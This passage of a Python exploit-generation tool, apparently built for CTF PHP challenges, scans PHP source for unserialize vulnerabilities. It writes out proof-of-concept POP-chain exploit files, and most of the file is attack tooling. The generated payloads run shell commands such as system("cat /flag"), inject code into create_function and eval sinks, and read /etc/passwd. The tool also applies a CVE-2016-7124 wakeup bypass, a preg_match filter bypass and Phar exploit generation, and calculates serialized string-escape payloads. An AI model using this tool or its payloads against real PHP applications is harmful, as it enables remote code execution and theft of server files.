        code += "    // Payload targets: 'flag.php', '/flag', 'flag.txt', '/etc/passwd'\n"
        for p_name, p_vis in props_map.items():
            # For POC generation, we try to mimic source as closely as possible.
            # But we also add a constructor to help set private/protected properties easily.
            code += f"    {p_vis} ${p_name};\n"
            
        # Add helper constructor to set any property via array or direct args
        # This helps bypass private visibility restrictions during POC object creation
        code += "\n    public function __construct($props = []) {\n"
        code += "        foreach($props as $k => $v) {\n"
        code += "            $this->$k = $v;\n"
        code += "        }\n"
        code += "    }\n\n"
        code += "    public function linkReference($p1, $p2) {\n"
        code += "        $this->$p2 = &$this->$p1;\n"
        code += "    }\n"
        code += "}\n\n"
        
        # Instantiate with values
        code += f"$obj = new {cls_name}();\n"
        
        # Collect assignments
        assignments = {}
        for prop, quote, val in comparisons:
            assignments[prop] = f"{quote}{val}{quote}"
            
        # Reference Handling
        ref_code = ""
        # Generate assignments via constructor-like setters logic or direct if public
        
        # Re-write instantiation to use our new constructor for values
        code = code.replace(f"$obj = new {cls_name}();\n", "")
        
        # Inject Payload Config with various flag options
        code += "// --- Payload Configuration ---\n"
        code += "// Uncomment the line corresponding to your target environment\n"
        code += "$target_file = 'flag.php';       // Common web flags\n"
        code += "// $target_file = '/flag';       // Common CTF root flags\n"
        code += "// $target_file = 'flag.txt';    // Text flags\n"
        code += "// $target_file = '/etc/passwd'; // LFI test\n\n"
        
        code += "$target_cmd = 'system(\"cat /flag\");'; \n"
        code += "// $target_cmd = 'system(\"cat flag.php\");';\n"
        code += "// $target_cmd = 'system(\"type flag.php\");'; // Windows\n"
        code += "// $target_cmd = 'passthru(\"cat /flag\");';\n\n"
        
        code += "$target_code = '}include(\"flag.php\");echo $flag;//'; // For create_function injection\n"
        code += "$eval_code = \"show_source('flag.php');\"; // For eval injection\n"
        code += "// -----------------------------\n\n"

        code += f"$props = array(\n"
        for p_name, p_vis in props_map.items():
             # Heuristic for default values
             if p_name in assignments:
                 val = assignments[p_name]
             else:
                 lower_p = p_name.lower()
                 if any(k in lower_p for k in ['file', 'path', 'url']):
                     val = "$target_file"
                 elif any(k in lower_p for k in ['cmd', 'command', 'exec']):
                     val = "$target_cmd"
                 elif any(k in lower_p for k in ['code', 'func']):
                     val = "$target_code"
                 elif any(k in lower_p for k in ['act', 'eval']):
                     val = "$eval_code"
                 else:
                     val = "$target_file" # Default fallback
                     
             code += f"    '{p_name}' => {val},\n"
        code += ");\n"
        code += f"$obj = new {cls_name}($props);\n"
        
        # Late binding for References (Ref logic needs to be after object creation)
        if refs:
            code += "// Handling References detected (e.g. === checks)\n"        
            for p1, p2 in refs:
                code += f"$obj->linkReference('{p1}', '{p2}');\n"

        bypass_args = {
            'cve_bypass': cve_bypass,
            'regex_bypass': regex_bypass,
            'session_mode': session_mode,
            'base64_mode': base64_mode
        }
        code += get_bypass_php_block('$obj', **bypass_args)
            
        poc_parts.append(code)
            
    if poc_parts:

        final_poc = "<?php\n\n" + "\n// POC Segment \n".join(poc_parts) + "\n?>"
        if output_file:
            with open(output_file, 'w') as f:
                f.write(final_poc)
            print(f"[+] POC generated in {output_file}")
            if cve_bypass: print("[!] CVE-2016-7124 Bypass injection applied")
        else:
            print(final_poc)
    else:
        print("[-] No classes found to generate POC.")

def calc_escape(args):
    """
    Calculates constraints for String Escape (eating or formatting)
    user input: "A" -> "BB" (Expansion)
    user input: "ABC" -> "X" (Contraction)
    """
    target = args.escape_target
    keyword = args.escape_keyword
    replacement = args.escape_replacement
    
    if not (target and keyword and replacement):
        print("[-] Escape calculation requires --escape-target, --escape-keyword, and --escape-replacement")
        return

    len_k = len(keyword)
    len_r = len(replacement)
    
    # Structure we generally want to eat or push:
    # ";s:4:"pass";s:6:"hacked";}  (Example target payload to inject)
    target_len = len(target)
    
    print(f"[*] Calculating escape for Target='{target}' (Len: {target_len})")
    print(f"    Transformation: '{keyword}' ({len_k}) -> '{replacement}' ({len_r})")
    
    diff = len_r - len_k
    
    if diff == 0:
        print("[-] Replacement length is same as keyword length. No length escape possible.")
        return
        
    if diff > 0:
        # Expansion (e.g. u -> oo)
        # We usually want to push out content to overflow into next property
        # "s:XX:"... payload ...";
        # We need to fill XX characters.
        # This usually implies we are injecting into a value that gets expanded.
        # Required Count * Diff = Target Length ? 
        # Usually it's: Count * Diff = characters_to_push
        print(f"[+] EXPANSION Mode (Delta +{diff})")
        print(f"    To generate a specific overflow of {target_len} bytes:")
        if target_len % diff == 0:
            count = target_len // diff
            print(f"    Required instances of '{keyword}': {count}")
            print(f"    Payload: {keyword * count}")
        else:
            print(f"    [-] Target length {target_len} is not divisible by delta {diff}.")
            
    else:
        # Contraction (e.g. admin -> empty)
        # We usually want to consume characters (the structure)
        # '";s:4:"pass";s:6:"hacked";}' -> We want to 'eat' the structure preceding this.
        abs_diff = abs(diff)
        print(f"[+] CONTRACTION Mode (Delta -{abs_diff})")
        if target_len % abs_diff == 0:
            count = target_len // abs_diff
            print(f"    Required instances of '{keyword}' to consume {target_len} bytes: {count}")
        else:
            print(f"    [-] Target length is not divisible by delta.")

def main():
    # Implicit defaults if no complex args
    if len(sys.argv) == 1 or (len(sys.argv) == 2 and sys.argv[1] == 'scan'):
        # Check if problem.php exists in current dir
        if os.path.exists('problem.php'):
            print("[*] Defaulting to: Scan problem.php -> poc.php")
            with open('problem.php', 'r') as f:
                content = f.read()
            classes = extract_class_body(content)
            # Try magic chain first
            generate_pop_chain(classes, 'poc.php')
            return

    parser = argparse.ArgumentParser(description="Advanced PHP Unserialize Tool")
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Scan Command
    scan_parser = subparsers.add_parser('scan', help='Scan files for unserialize vulnerabilities')
    scan_parser.add_argument("path", help="File or Directory to scan")
    scan_parser.add_argument("--poc", help="Generate POC file (for single file)", default=None)
    scan_parser.add_argument("--phar", help="Generate Phar generator script", default=None)
    scan_parser.add_argument("--cve", action="store_true", help="Apply CVE-2016-7124 bypass in POC (Property Count+1)")
    scan_parser.add_argument("--session", action="store_true", help="Generate Session| prefix in POC")
    scan_parser.add_argument("--regex", action="store_true", help=r"Apply O:+123 bypass for preg_match filter ([oc]:\d+:)")
    scan_parser.add_argument("--base64", action="store_true", help="Apply Base64 encoding to final output")
    
    # Escape Calc Command
    esc_parser = subparsers.add_parser('escape', help='Calculate string escape payloads')
    esc_parser.add_argument("--target", dest="escape_target", help="The string you want to inject or consume")
    esc_parser.add_argument("--keyword", dest="escape_keyword", help="The keyword being replaced (e.g. 'bad')")
    esc_parser.add_argument("--replace", dest="escape_replacement", help="The replacement string (e.g. 'good')")

    args = parser.parse_args()
    
    if args.command == 'escape':
        calc_escape(args)
        return

    # Fallback for old usage (no subcommand)
    path_arg = None
    if args.command == 'scan':
        path_arg = args.path
    elif not args.command and len(sys.argv) > 1 and not sys.argv[1].startswith('-'):
        # Just filename passed
        path_arg = sys.argv[1]
        
    if not path_arg:
        if not args.command:
             parser.print_help()
        return

    if path_arg:
        if os.path.isfile(path_arg):
            print(f"[*] Scanning file: {path_arg}")
            with open(path_arg, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            classes = extract_class_body(content)
            report = analyze_classes(classes)
            
            for r in report:
                print(f"  [Class: {r['name']}]")
                if r['props']: print(f"    Properties: {', '.join(r['props'])}")
                if r['magic']: print(f"    Magic Methods: {', '.join(r['magic'])}")
                if r['dangerous']: print(f"    Dangerous Funcs: {', '.join(r['dangerous'])}")
                if r['patterns']: print(f"    Patterns: {', '.join(r['patterns'])}")
            
            # POC Generation Logic
            # Check args from both direct invocation or subcommand
            poc_file = getattr(args, 'poc', None)
            phar_file = getattr(args, 'phar', None)
            cve = getattr(args, 'cve', False)
            session = getattr(args, 'session', False)
            regex = getattr(args, 'regex', False)
            base64_mode = getattr(args, 'base64', False)

            if poc_file:
                 # Prefer POP chain generation loop
                 generate_pop_chain(classes, poc_file, content=content, cve_bypass=cve, session_mode=session, regex_bypass=regex, base64_mode=base64_mode)
            
            if phar_file:
                 generate_phar_exploit(classes, phar_file)
            
        elif os.path.isdir(path_arg):
            print(f"[*] Scanning directory: {path_arg}")
            for root, dirs, files in os.walk(path_arg):
                for file in files:
                    if file.endswith('.php'):
                        path = os.path.join(root, file)
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        classes = extract_class_body(content)
                        report = analyze_classes(classes)
                        
                        if report:
                            print(f"File: {path}")
                            for r in report:
                                print(f"  [Class: {r['name']}] (Magic: {len(r['magic'])}, Dangerous: {len(r['dangerous'])})")

if __name__ == "__main__":
    main()
